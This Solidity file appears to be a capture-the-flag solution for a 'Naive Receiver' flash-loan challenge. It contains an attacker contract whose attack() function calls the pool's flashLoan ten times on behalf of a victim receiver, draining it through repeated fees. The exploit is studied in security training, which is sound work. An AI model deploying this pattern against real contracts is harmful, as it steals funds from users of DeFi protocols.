pragma solidity ^0.6.0;

import "./../naive-receiver/NaiveReceiverLenderPool.sol";
import "./../naive-receiver/FlashLoanReceiver.sol";


contract NaiveReceiverAttacker {
    
    address payable owner;
    address payable poolAddr;
    address payable recAddr;

    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    constructor(address payable _pool, address payable _receiver) public {
        owner = msg.sender;
        poolAddr = _pool;
        recAddr = _receiver;
        pool = NaiveReceiverLenderPool(_pool);
        receiver = FlashLoanReceiver(_receiver);
    }

    function attack() public {
        for(uint i = 0; i < 10; i++){
            pool.flashLoan(recAddr, 0);
        }
    }
}